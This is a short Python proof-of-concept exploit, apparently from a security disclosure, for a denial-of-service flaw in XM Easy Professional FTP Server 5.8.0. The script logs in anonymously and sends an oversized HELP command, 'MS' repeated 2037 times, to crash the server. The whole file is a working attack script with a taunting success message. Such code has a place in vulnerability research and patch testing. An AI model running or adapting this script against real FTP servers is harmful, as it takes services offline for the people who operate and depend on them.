# XM Easy Professional FTP Server 5.8.0
# Denial of Service Vulnerability
# Note: FTP account is required for exploitation
# http://www.mertsarica.com

from ftplib import *
import sys
import ftplib

try: 
    ftp = FTP('localhost')   # connect to host, default port
except:
    print "Connection error"
    sys.exit(1)
    
try:
    ftp.login()              # user anonymous, passwd anonymous@
except:
    print "Login failed"
    sys.exit(1)

packet = "HELP " + "MS" * 2037 # magic packet

try:
    ftp.sendcmd(packet)
    ftp.quit()
except ftplib.all_errors, error:
    print("Very good, young padawan, but you still have much to learn...")
